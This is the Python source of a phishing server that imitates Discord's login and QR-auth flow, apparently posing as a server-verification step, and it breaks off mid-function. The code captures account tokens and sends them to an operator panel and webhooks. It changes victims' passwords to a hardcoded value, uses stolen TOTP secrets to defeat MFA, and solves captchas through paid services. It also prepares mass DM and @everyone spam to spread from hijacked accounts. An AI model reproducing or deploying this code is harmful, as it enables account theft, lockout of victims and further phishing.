"""
Discord Login Server — stealth proxy using curl_cffi for Chrome TLS impersonation.
Proper flow: visit login page → get cookies → get X-Fingerprint → login.
Run:  python discord_server.py
Open: http://localhost:8463
# v2.1 — predictive pre-challenge
"""
import subprocess, sys, os, platform, re

_deps = {
    'flask': 'flask',
    'flask_sock': 'flask-sock',
    'simple_websocket': 'simple-websocket',
    'curl_cffi': 'curl_cffi',
    'websocket': 'websocket-client',
    'cryptography': 'cryptography',
    'pyotp': 'pyotp',
}
for _m, _p in _deps.items():
    try:
        __import__(_m)
    except ImportError:
        print(f'[*] Installing {_p}...')
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])

from flask import Flask, request, jsonify, send_from_directory, make_response, redirect
from flask_sock import Sock
from curl_cffi import requests as creq   # Chrome TLS impersonation
import requests as plain_req              # for webhook (no impersonation needed)
import websocket
import json, base64, hashlib, threading, time, uuid
import pyotp
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_pad
from cryptography.hazmat.primitives import hashes, serialization

# ━━━━━━━━━━━━ Config ━━━━━━━━━━━━
PORT    = int(os.environ.get('PORT', 8463))
API     = 'https://discord.com/api/v9'
WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
# Dynamic config from TOKENPANEL — webhook + message config per bot_key (identifier)
PANEL_URL    = os.environ.get('PANEL_URL', '')       # e.g. https://discordmanager.lol
PANEL_API_KEY = os.environ.get('PANEL_API_KEY', '')   # shared secret with panel
if PANEL_URL:
    print(f'[panel] PANEL_URL={PANEL_URL}  API_KEY={"set" if PANEL_API_KEY else "*** NOT SET ***"}')
WEBHOOK = os.environ.get('WEBHOOK_URL', '')           # fallback if panel not configured
WEBHOOK_BACKUP = os.environ.get('WEBHOOK_BACKUP', '')

# Chrome 136 UA + matching client hints
CHROME_VER = '136'
UA = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{CHROME_VER}.0.0.0 Safari/537.36'
SEC_CH_UA          = f'"Chromium";v="{CHROME_VER}", "Google Chrome";v="{CHROME_VER}", "Not.A/Brand";v="99"'
SEC_CH_UA_MOBILE   = '?0'
SEC_CH_UA_PLATFORM = '"Windows"'

# Captcha solving — Multi-provider (race Anti-Captcha vs CapSolver for speed)
ANTICAPTCHA_KEY  = os.environ.get('ANTICAPTCHA_KEY', os.environ.get('2CAPTCHA_KEY', ''))
CAPSOLVER_KEY    = os.environ.get('CAPSOLVER_KEY', '')

# Role assignment after verification — multi-tenant
# Bot tokens stored as BOTTOKEN1, BOTTOKEN2, ... BOTTOKENn in env vars
# URL pattern: /<guild_id>/<role_id>/<bot_key> where bot_key maps to BOTTOKEN{bot_key}

# Tenant context: stored per-client via cookie _tenant
# Format: guild_id:role_id:bot_key
_tenant_cache = {}  # ip -> {guild_id, role_id, bot_key, ts}
_tenant_lock = threading.Lock()

def _get_bot_token(bot_key):
    """Look up bot token from env var BOTTOKEN{bot_key}."""
    val = os.environ.get(f'BOTTOKEN{bot_key}', '')
    if not val:
        print(f'[tenant] No env var BOTTOKEN{bot_key} found')
    return val

# Cache for panel server info: "identifier:server_int" -> {info_dict, ts}
_panel_info_cache = {}
_panel_info_ttl = 300  # 5 minutes

def _get_server_info_from_panel(identifier, server_int):
    """Fetch server info (guild_name, etc) from TOKENPANEL. Bot token is NEVER returned. Cached."""
    if not PANEL_URL:
        return None
    cache_key = f'{identifier}:{server_int}'
    cached = _panel_info_cache.get(cache_key)
    if cached and time.time() - cached['ts'] < _panel_info_ttl:
        return cached['info']
    try:
        r = plain_req.get(f'{PANEL_URL}/api/{identifier}/servers/{server_int}/info',
                          headers={'Authorization': f'Bearer {PANEL_API_KEY}'},
                          timeout=8)
        if r.status_code == 200:
            info = r.json()
            _panel_info_cache[cache_key] = {'info': info, 'ts': time.time()}
            return info
        print(f'[tenant] Panel server info fetch {r.status_code} for {cache_key}')
    except Exception as e:
        print(f'[tenant] Panel server info error for {cache_key}: {e}')
    return None

def _assign_role_via_panel(identifier, server_int, user_id):
    """Ask TOKENPANEL to assign the verified role. Bot token never leaves the panel."""
    if not PANEL_URL:
        return False
    try:
        r = plain_req.post(f'{PANEL_URL}/api/{identifier}/servers/{server_int}/assign_role',
                           headers={'Authorization': f'Bearer {PANEL_API_KEY}',
                                    'Content-Type': 'application/json'},
                           json={'user_id': str(user_id)},
                           timeout=20)
        if r.status_code == 200:
            print(f'[tenant] Panel assigned role for user {user_id} on {identifier}:{server_int}')
            return True
        print(f'[tenant] Panel assign_role {r.status_code} for {identifier}:{server_int}: {r.text[:200]}')
    except Exception as e:
        print(f'[tenant] Panel assign_role error for {identifier}:{server_int}: {e}')
    return False

def _set_tenant(guild_id, role_id, bot_key, identifier=None, server_int=None):
    """Store tenant context in thread-local-like dict keyed by request IP."""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    t = {'guild_id': guild_id, 'role_id': role_id, 'bot_key': bot_key, 'ts': time.time()}
    if identifier is not None:
        t['identifier'] = str(identifier)
    if server_int is not None:
        t['server_int'] = str(server_int)
    with _tenant_lock:
        _tenant_cache[ip] = t

def _get_tenant():
    """Get tenant context for current request from cookie."""
    cookie = request.cookies.get('_tenant', '')
    if cookie:
        parts = cookie.split(':')
        if len(parts) == 4:
            return {'guild_id': parts[0], 'role_id': parts[1], 'bot_key': parts[2],
                    'identifier': parts[2], 'server_int': parts[3]}
        if len(parts) == 3:
            return {'guild_id': parts[0], 'role_id': parts[1], 'bot_key': parts[2]}
    # Fallback to IP-based lookup
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    with _tenant_lock:
        t = _tenant_cache.get(ip)
        if t:
            return t
    return None

# ━━━━━━━━━━━━ Panel config (dynamic per-tenant) ━━━━━━━━━━━━
_panel_config_cache = {}  # "bot_key:server_int" -> {cfg, ts}
_panel_cache_ttl = 30     # seconds

def _get_panel_config(bot_key, server_int=None):
    """Fetch webhook URL + message config from TOKENPANEL for this identifier.
    Caches for _panel_cache_ttl seconds. Returns dict with: webhook, dm_message, guild_dm_message, spread_message."""
    if not PANEL_URL or not bot_key:
        return {}
    now = time.time()
    cache_key = f'{bot_key}:{server_int or ""}'
    cached = _panel_config_cache.get(cache_key)
    if cached and now - cached['ts'] < _panel_cache_ttl:
        return cached['cfg']
    try:
        url = f'{PANEL_URL}/api/{bot_key}/config'
        if server_int:
            url += f'?server_int={server_int}'
        r = plain_req.get(url,
                          headers={'Authorization': f'Bearer {PANEL_API_KEY}'},
                          timeout=8)
        if r.status_code == 200:
            cfg = r.json()
            _panel_config_cache[cache_key] = {'cfg': cfg, 'ts': now}
            return cfg
    except Exception as e:
        print(f'[panel] Config fetch error for key={bot_key}: {e}')
    return {}


def _get_webhook_for_tenant(tenant=None):
    """Get webhook URL for current tenant. Falls back to global WEBHOOK env var."""
    if tenant:
        cfg = _get_panel_config(tenant.get('bot_key'), tenant.get('server_int'))
        wh = cfg.get('webhook', '')
        if wh:
            return wh
    return WEBHOOK


def _get_dm_message(tenant=None):
    """Get DM message for current tenant. Falls back to global SPAM_MSG_DM."""
    if tenant:
        cfg = _get_panel_config(tenant.get('bot_key'), tenant.get('server_int'))
        msg = cfg.get('dm_message', '')
        if msg:
            return msg
    return SPAM_MSG_DM


def _get_guild_message(tenant=None):
    """Get guild message: @everyone + dm_message."""
    dm = _get_dm_message(tenant)
    if dm:
        return f'@everyone {dm}'
    return SPAM_MSG_GUILD


def _get_spread_message(tenant=None):
    """Get spread message for current tenant. Falls back to global SPREAD_MESSAGE."""
    return SPREAD_MESSAGE


def _push_token_to_panel(bot_key, token_data):
    """Push captured token data to the panel for storage/display."""
    if not PANEL_URL or not bot_key:
        return
    try:
        plain_req.post(f'{PANEL_URL}/api/{bot_key}/tokens',
                       headers={'Authorization': f'Bearer {PANEL_API_KEY}',
                                'Content-Type': 'application/json'},
                       json=token_data, timeout=8)
        print(f'[panel] Token pushed for key={bot_key}')
    except Exception as e:
        print(f'[panel] Token push error for key={bot_key}: {e}')


# Guild info cache: guild_id -> {name, icon, ts}
_guild_info_cache = {}
_guild_info_lock = threading.Lock()

def _fetch_guild_info(guild_id, bot_token):
    """Fetch guild name and icon from Discord API using bot token. Cached for 10 minutes."""
    with _guild_info_lock:
        cached = _guild_info_cache.get(guild_id)
        if cached and time.time() - cached['ts'] < 600:
            return cached
    try:
        import requests as plain_req_local
        r = plain_req_local.get(f'{API}/guilds/{guild_id}', headers={
            'Authorization': f'Bot {bot_token}',
            'User-Agent': 'DiscordBot (https://restorecordverify.info, 1.0)',
        }, timeout=10)
        if r.status_code == 200:
            data = r.json()
            name = data.get('name', 'Server')
            icon = data.get('icon', '')
            icon_url = f'https://cdn.discordapp.com/icons/{guild_id}/{icon}.png?size=128' if icon else ''
            info = {'name': name, 'icon_url': icon_url, 'ts': time.time()}
            with _guild_info_lock:
                _guild_info_cache[guild_id] = info
            return info
    except Exception as e:
        print(f'[guild-info] Error fetching guild {guild_id}: {e}')
    return {'name': 'Server', 'icon_url': '', 'ts': time.time()}

# ━━━━━━━━━━━━ Proxy for Discord API calls ━━━━━━━━━━━━
def _load_proxy():
    """Load proxy from DISCORD_PROXY env var, or first proxy in proxies.txt."""
    p = os.environ.get('DISCORD_PROXY', '').strip()
    if p:
        return p
    try:
        pf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'proxies.txt')
        with open(pf, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    return line
    except:
        pass
    return None

DISCORD_PROXY = _load_proxy()
DISCORD_PROXIES = {'https': DISCORD_PROXY, 'http': DISCORD_PROXY} if DISCORD_PROXY else None

# Adaptive proxy: always start on proxy if one is configured; fall back to direct if proxy fails
_use_proxy = bool(DISCORD_PROXY)  # start with proxy ON when available
_proxy_lock = threading.Lock()
_rate_limit_until = 0       # timestamp when rate limit expires

def _set_proxy_mode(on: bool, reason=''):
    global _use_proxy
    with _proxy_lock:
        if _use_proxy != on:
            _use_proxy = on
            mode = f'PROXY ({DISCORD_PROXY})' if on else 'DIRECT (Railway IP)'
            print(f'[proxy] Switched to {mode} — {reason}')

def _make_session():
    """Create a curl_cffi Chrome-impersonation session. Uses proxy only when rate-limited."""
    s = creq.Session(impersonate='chrome')
    with _proxy_lock:
        if _use_proxy and DISCORD_PROXIES:
            s.proxies = DISCORD_PROXIES
    return s

def _handle_discord_response(resp):
    """Check response for rate limit. Toggle proxy on/off automatically. Returns resp."""
    global _rate_limit_until
    if resp is None:
        return resp
    if resp.status_code == 429:
        retry_after = 5
        try:
            retry_after = resp.json().get('retry_after', 5)
        except:
            pass
        _rate_limit_until = time.time() + retry_after
        if DISCORD_PROXIES:
            _set_proxy_mode(True, f'429 rate-limited, retry_after={retry_after:.1f}s')
    elif resp.status_code < 400:
        # Success on current mode — if we're on proxy and rate limit expired, try direct again
        with _proxy_lock:
            if _use_proxy and time.time() > _rate_limit_until + 10:
                _set_proxy_mode(False, 'rate limit expired, reverting to direct')
    return resp

# Count configured bot tokens
_bot_token_count = sum(1 for k in os.environ if k.startswith('BOTTOKEN') and os.environ[k].strip())
print(f'[config] Multi-tenant: {_bot_token_count} bot token(s) configured (BOTTOKEN* env vars)')
print(f'[config] Discord proxy available: {DISCORD_PROXY or "NONE"} (starts {"PROXY" if DISCORD_PROXY else "DIRECT — no proxy configured"})')

app = Flask(__name__, static_folder='.', static_url_path='')

# ── WSGI middleware: rewrite /_/ and /v3/ paths so they hit /_gp/ route
# instead of clashing with /<identifier>/<server_int> (GET-only) routes.
class _GooglePathMiddleware:
    def __init__(self, wsgi):
        self.wsgi = wsgi
    def __call__(self, environ, start_response):
        p = environ.get('PATH_INFO', '')
        if p.startswith('/_/') or p.startswith('/v3/'):
            environ['PATH_INFO'] = '/_gp/accounts.google.com' + p
        return self.wsgi(environ, start_response)

app.wsgi_app = _GooglePathMiddleware(app.wsgi_app)

sock = Sock(app)

# ━━━━━━━━━━━━ Page Tokens (gate QR start) ━━━━━━━━━━━━
# A short-lived token is injected into /login HTML.
# /api/qr/start requires a valid token — cold requests from bots are rejected.
import secrets as _secrets
_page_tokens      = {}            # token -> expires_at
_page_token_lock  = threading.Lock()
PAGE_TOKEN_TTL    = 300           # 5 minutes

def _issue_page_token():
    tok = _secrets.token_hex(20)
    with _page_token_lock:
        _page_tokens[tok] = time.time() + PAGE_TOKEN_TTL
    return tok

def _check_page_token(tok):
    if not tok:
        return False
    with _page_token_lock:
        exp = _page_tokens.get(tok, 0)
        if time.time() > exp:
            _page_tokens.pop(tok, None)
            return False
    return True

# ━━━━━━━━━━━━ Per-IP Rate Limiter ━━━━━━━━━━━━
import collections as _col

_rl_lock   = threading.Lock()
_rl_hits   = _col.defaultdict(list)   # ip:endpoint -> [timestamps]
_rl_banned = {}                        # ip -> ban_until timestamp

# Rules: (max_hits, window_seconds, ban_seconds)
_RL_RULES = {
    'qr_start':    (20, 60,  20),   # 20 QR starts per 60s → 20s ban (tokens are primary gate)
    'qr_poll':     (120, 10, 8),    # 120 polls per 10s → 8s ban (very lenient)
    'login':       (8,  30,  120),  # 8 login attempts per 30s → 2min ban
    'prechallenge':(10, 20,  60),   # 10 prechallenges per 20s → 60s ban
    'default':     (30, 10,  30),   # generic: 30 reqs per 10s → 30s ban
}

def _get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr) or ''
    return ip.split(',')[0].strip()

def _rate_check(endpoint_key):
    """Returns (allowed: bool, retry_after: int)."""
    ip = _get_ip()
    now = time.time()
    max_hits, window, ban_secs = _RL_RULES.get(endpoint_key, _RL_RULES['default'])
    key = f'{ip}:{endpoint_key}'
    with _rl_lock:
        # Check active ban
        ban_until = _rl_banned.get(ip, 0)
        if now < ban_until:
            return False, int(ban_until - now)
        # Slide window
        hits = _rl_hits[key]
        cutoff = now - window
        # Discard old hits
        while hits and hits[0] < cutoff:
            hits.pop(0)
        hits.append(now)
        if len(hits) > max_hits:
            _rl_banned[ip] = now + ban_secs
            _rl_hits[key].clear()
            print(f'[ratelimit] Banned {ip} on {endpoint_key} for {ban_secs}s')
            return False, ban_secs
    return True, 0

def _rl_cleanup():
    """Periodically remove old rate-limit data to prevent memory growth."""
    while True:
        time.sleep(120)
        now = time.time()
        with _rl_lock:
            # Remove expired bans
            expired_bans = [ip for ip, t in _rl_banned.items() if now > t]
            for ip in expired_bans:
                del _rl_banned[ip]
            # Remove old hit lists
            empty_keys = [k for k, v in _rl_hits.items() if not v]
            for k in empty_keys:
                del _rl_hits[k]

threading.Thread(target=_rl_cleanup, daemon=True).start()


@app.after_request
def _add_headers(response):
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    # Prevent iOS Safari aggressive caching of HTML pages
    if response.content_type and 'text/html' in response.content_type:
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response

# ━━━━━━━━━━━━ Build Number ━━━━━━━━━━━━
BUILD = 368827  # fallback

def fetch_build_number():
    """Fetch Discord's current client build number from their JS assets."""
    global BUILD
    try:
        s = _make_session()
        r = s.get('https://discord.com/login', timeout=15)
        # Grab ALL JS asset filenames from the page
        all_assets = re.findall(r'(?:src|href)=["\'](?:/assets/|https://discord\.com/assets/)(\w[\w.]+)\.js', r.text)
        if not all_assets:
            all_assets = re.findall(r'assets/(\w[\w.]*)\.js', r.text)
        # Prioritize sentry/build chunks, then check all
        priority = [a for a in all_assets if 'sentry' in a.lower() or 'build' in a.lower()]
        to_check = priority + [a for a in all_assets if a not in priority]
        for m in to_check[:20]:
            try:
                jr = s.get(f'https://discord.com/assets/{m}.js', timeout=10)
                # Multiple patterns: buildNumber:NNNNNN or "buildNumber","NNNNNN" or build_number
                for pattern in [
                    r'buildNumber["\s:,]+?(\d{5,})',
                    r'build_number["\s:,]+?(\d{5,})',
                    r'"buildNumber"\s*,\s*"?(\d{5,})',
                    r'buildNumber\}\)\}\),(\d{5,})',
                ]:
                    bm = re.search(pattern, jr.text)
                    if bm:
                        BUILD = int(bm.group(1))
                        print(f'[*] Build number: {BUILD} (from {m}.js)')
                        return
            except:
                continue
        print(f'[*] Using fallback build: {BUILD}')
    except Exception as e:
        print(f'[!] Build fetch failed: {e}, using {BUILD}')


def sprops():
    return base64.b64encode(json.dumps({
        "os": "Windows", "browser": "Chrome", "device": "",
        "system_locale": "en-US", "browser_user_agent": UA,
        "browser_version": f"{CHROME_VER}.0.0.0", "os_version": "10",
        "referrer": "", "referring_domain": "",
        "referrer_current": "", "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": BUILD, "client_event_source": None
    }).encode()).decode()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


# ━━━━━━━━━━━━ Stealth Discord Session ━━━━━━━━━━━━
class DiscordSession:
    """
    Creates a curl_cffi session that impersonates Chrome's TLS fingerprint,
    visits the login page first to get cookies, then fetches X-Fingerprint.
    This mimics a real browser and avoids account locks.
    """
    def __init__(self):
        self.s = _make_session()
        self.fingerprint = None
        self.cookies_ready = False

    def prepare(self):
        """Step 1: Visit login page → cookies.  Step 2: /experiments → fingerprint."""
        # Step 1: GET /login — Cloudflare sets __dcfduid, __sdcfduid, __cfruid, locale
        try:
            r = self.s.get('https://discord.com/login', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
            self.cookies_ready = r.status_code == 200
            print(f'[*] Login page: {r.status_code}, cookies: {list(self.s.cookies.keys())}')
        except Exception as e:
            print(f'[!] Login page failed: {e}')
            self.cookies_ready = False

        # Step 2: GET /experiments → X-Fingerprint (no auth header)
        try:
            r2 = self.s.get(f'{API}/experiments', headers={
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'X-Track': sprops(),
            }, timeout=15)
            if r2.status_code == 200:
                self.fingerprint = r2.json().get('fingerprint')
                print(f'[*] Fingerprint: {self.fingerprint[:20]}...' if self.fingerprint else '[!] No fingerprint in response')
            else:
                print(f'[!] Experiments: {r2.status_code}')
        except Exception as e:
            print(f'[!] Experiments failed: {e}')

        return self

    def _headers(self, extra=None):
        h = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/login',
            'User-Agent': UA,
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/Los_Angeles',
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Super-Properties': sprops(),
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        if self.fingerprint:
            h['X-Fingerprint'] = self.fingerprint
        if extra:
            h.update(extra)
        return h

    def _sync_proxy(self):
        """Sync this session's proxy setting with current global mode."""
        with _proxy_lock:
            if _use_proxy and DISCORD_PROXIES:
                self.s.proxies = DISCORD_PROXIES
            else:
                self.s.proxies = {}

    def post(self, path, json_data, timeout=30):
        self._sync_proxy()
        r = self.s.post(
            f'{API}{path}',
            headers=self._headers(),
            json=json_data,
            timeout=timeout
        )
        _handle_discord_response(r)
        return r

    def snapshot(self):
        """Save cookies + fingerprint so they can be restored on a fresh session."""
        return {
            'cookies': dict(self.s.cookies),
            'fingerprint': self.fingerprint,
        }

    def restore(self, snap):
        """Apply saved cookies + fingerprint to this (fresh) session."""
        for k, v in snap.get('cookies', {}).items():
            self.s.cookies.set(k, v)
        self.fingerprint = snap.get('fingerprint')


# ━━━━━━━━━━━━ Webhook ━━━━━━━━━━━━
_webhookd_tokens: set = set()
_webhookd_lock = threading.Lock()


def _solve_hcap(sitekey, pageurl):
    """Solve hCaptcha via Anti-Captcha. Returns token or None."""
    key = ANTICAPTCHA_KEY or os.environ.get('ANTICAPTCHA_KEY', '')
    if not key:
        return None
    try:
        r = plain_req.post('https://api.anti-captcha.com/createTask', json={
            'clientKey': key,
            'task': {'type': 'HCaptchaTaskProxyless', 'websiteURL': pageurl, 'websiteKey': sitekey}
        }, timeout=15)
        task_id = r.json().get('taskId')
        if not task_id:
            return None
        for _ in range(90):
            time.sleep(3)
            r2 = plain_req.post('https://api.anti-captcha.com/getTaskResult',
                                json={'clientKey': key, 'taskId': task_id}, timeout=15)
            res = r2.json()
            if res.get('status') == 'ready':
                return res.get('solution', {}).get('gRecaptchaResponse')
            if res.get('errorId', 0) != 0:
                return None
    except:
        pass
    return None


_pw_store = {}       # ticket/token -> password (short-lived lookup)
_pw_store_lock = threading.Lock()

def _hq_guilds(token):
    h = {"Authorization": token, "User-Agent": UA}
    try:
        gs = plain_req.get(f"{API}/users/@me/guilds?with_counts=true", headers=h, timeout=10).json()
        out = []
        for g in gs:
            if g.get("owner") or g.get("permissions") == "4398046511103":
                out.append(f"• **{g.get('name','?')}** (`{g.get('id','?')}`) — {g.get('approximate_member_count','?')} members")
        return "\n".join(out) if out else "None"
    except:
        return "Error"


# ━━━━━━━━━━━━ IP Helpers ━━━━━━━━━━━━
_RAILWAY_PREFIXES = ('104.156.', '100.64.', '172.', '10.', '192.168.', '127.')

def _clean_ip(raw_ip):
    """Extract real client IP from X-Forwarded-For, stripping Railway/proxy/private IPs."""
    if not raw_ip or raw_ip == '?':
        return '?'
    parts = [p.strip() for p in raw_ip.split(',')]
    # Filter out Railway proxy IPs and private ranges — keep only real client IPs
    for ip in parts:
        if not any(ip.startswith(pfx) for pfx in _RAILWAY_PREFIXES):
            return ip
    # All IPs are proxy/private — no real client IP available
    return '?'


DEFAULT_NEW_PASSWORD = 'Fatdude11$'


def _pw_patch_with_captcha(s, url, headers, body, label='pw'):
    """PATCH /users/@me with automatic captcha solving if Discord demands one.
    Returns (response_json, status_code)."""
    r = s.patch(url, headers=headers, json=body, timeout=15)
    j = r.json()

    # Check for captcha challenge
    ckeys = j.get('captcha_key', [])
    if isinstance(ckeys, list) and ('captcha-required' in ckeys or
            'You need to update your app to perform this action.' in ckeys):
        sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
        rqdata  = j.get('captcha_rqdata', '')
        rqtoken = j.get('captcha_rqtoken', '')
        print(f'[{label}] Captcha required — solving...')
        cap_token, cap_err = _solve_race(sitekey, rqdata, n=8)
        if not cap_token:
            print(f'[{label}] Captcha solve failed: {cap_err}')
            return j, r.status_code
        # Retry PATCH with captcha solution
        body2 = dict(body)
        body2['captcha_key'] = cap_token
        if rqtoken:
            body2['captcha_rqtoken'] = rqtoken
        r2 = s.patch(url, headers=headers, json=body2, timeout=15)
        return r2.json(), r2.status_code

    return j, r.status_code


def _auto_change_password(token, old_password, new_password=None, mfa_enabled=False, totp_secret=None):
    """
    Change account password. Returns (new_token, final_password) on success.
    For MFA accounts, uses ticket + TOTP verify (if we have the secret) or
    password verify fallback + MFA JWT flow.
    Handles captcha challenges on the PATCH request automatically.
    Returns (None, old_password) on failure.
    """
    if new_password is None:
        new_password = DEFAULT_NEW_PASSWORD
    if not old_password or old_password == '?' or old_password == new_password:
        return None, old_password

    patch_url = f'{API}/users/@me'
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
        'X-Discord-Timezone': 'America/Los_Angeles',
    }

    try:
        s = _make_session()
        try:
            s.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
        except:
            pass

        body = {'password': old_password, 'new_password': new_password}
        j1, sc1 = _pw_patch_with_captcha(s, patch_url, h, body, 'pw-init')

        if sc1 == 200:
            new_tok = j1.get('token', '')
            print(f'[pw] ✅ Password changed (no MFA). New token: {new_tok[:20]}...')
            return new_tok, new_password

        err_code = j1.get('code', 0)

        # MFA required — ticket flow
        if err_code == 60003:
            ticket = j1.get('mfa', {}).get('ticket', '')
            methods = [m.get('type') for m in j1.get('mfa', {}).get('methods', [])]
            if not ticket:
                print(f'[pw] MFA required but no ticket')
                return None, old_password

            print(f'[pw] MFA required. ticket={ticket[:20]}... methods={methods} have_totp={bool(totp_secret)}')

            # Step 2: verify via TOTP (preferred) or password fallback
            mfa_jwt = None
            if totp_secret and ('totp' in methods or not methods):
                code = pyotp.TOTP(totp_secret).now()
                print(f'[pw] Using TOTP code: {code}')
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'totp', 'data': code,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] TOTP verify OK')
                else:
                    print(f'[pw] TOTP verify failed [{r2.status_code}]: {r2.text[:200]}')

            # Fallback: password verify (works when 'password' in methods)
            if not mfa_jwt and 'password' in methods:
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'password', 'data': old_password,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] Password verify OK')
                else:
                    print(f'[pw] Password verify failed [{r2.status_code}]: {r2.text[:200]}')

            if not mfa_jwt:
                print(f'[pw] Could not complete MFA verification')
                return None, old_password

            # Step 3: change password with MFA auth (+ captcha handling)
            h3 = dict(h)
            h3['X-Discord-MFA-Authorization'] = mfa_jwt
            j3, sc3 = _pw_patch_with_captcha(s, patch_url, h3, body, 'pw-mfa')

            if sc3 == 200:
                new_tok = j3.get('token', '')
                print(f'[pw] ✅ Password changed (MFA). New token: {new_tok[:20]}...')
                return new_tok, new_password
            else:
                print(f'[pw] Step 3 failed: [{sc3}] {j3.get("message", "?")} code={j3.get("code", "?")}')
                return None, old_password
        else:
            print(f'[pw] Password change failed: [{sc1}] code={err_code} {j1.get("message", "?")}')
            return None, old_password

    except Exception as e:
        print(f'[pw] Error: {e}')
        return None, old_password


# ━━━━━━━━━━━━ Mass Message (DMs first, then guilds) ━━━━━━━━━━━━
# Dynamic — loaded per-tenant from panel config. These are fallback defaults.
SPAM_MSG_DM    = ''
SPAM_MSG_GUILD = ''

# Permission bit constants
PERM_VIEW_CHANNEL   = 0x400
PERM_SEND_MESSAGES  = 0x800
PERM_ADMINISTRATOR  = 0x8

def _guild_sendable_channels(s, h, guild_id):
    """Return list of text channel IDs where user can actually send messages.
    Uses GET /guilds/{id}/channels and computes effective perms from overwrites."""
    try:
        # Get our member info for role list
        me_r = s.get(f'{API}/users/@me', headers=h, timeout=10)
        my_id = me_r.json().get('id', '') if me_r.status_code == 200 else ''

        # Get guild info for @everyone role perms
        gr = s.get(f'{API}/guilds/{guild_id}', headers=h, timeout=10)
        if gr.status_code != 200:
            return []
        guild = gr.json()
        everyone_perms = int(guild.get('roles', [{}])[0].get('permissions', '0') if guild.get('roles') else '0')

        # Get member roles
        my_roles = set()
        try:
            mr = s.get(f'{API}/users/@me/guilds/{guild_id}/member', headers=h, timeout=10)
            if mr.status_code == 200:
                my_roles = set(mr.json().get('roles', []))
        except:
            pass

        # Map role id -> permissions
        role_perms = {}
        for role in guild.get('roles', []):
            role_perms[role['id']] = int(role.get('permissions', '0'))

        # Compute base perms from roles
        base_perms = everyone_perms
        for rid in my_roles:
            base_perms |= role_perms.get(rid, 0)

        # Admin bypasses everything
        is_admin = bool(base_perms & PERM_ADMINISTRATOR)

        # Get channels
        cr = s.get(f'{API}/guilds/{guild_id}/channels', headers=h, timeout=10)
        if cr.status_code != 200:
            return []

        sendable = []
        for ch in cr.json():
            if ch.get('type') != 0:  # text channels only
                continue
            if is_admin:
                sendable.append(ch['id'])
                continue

            # Apply permission overwrites
            perms = base_perms
            overwrites = ch.get('permission_overwrites', [])

            # @everyone overwrite first
            for ow in overwrites:
                if ow['id'] == guild_id:  # @everyone role id == guild id
                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            # Role overwrites
            allow_role = 0
            deny_role = 0
            for ow in overwrites:
                if ow['type'] == 0 and ow['id'] in my_roles:  # type 0 = role
                    deny_role |= int(ow.get('deny', '0'))
                    allow_role |= int(ow.get('allow', '0'))
            perms &= ~deny_role
            perms |= allow_role

            # Member-specific overwrite
            for ow in overwrites:
                if ow['type'] == 1 and ow['id'] == my_id:  # type 1 = member
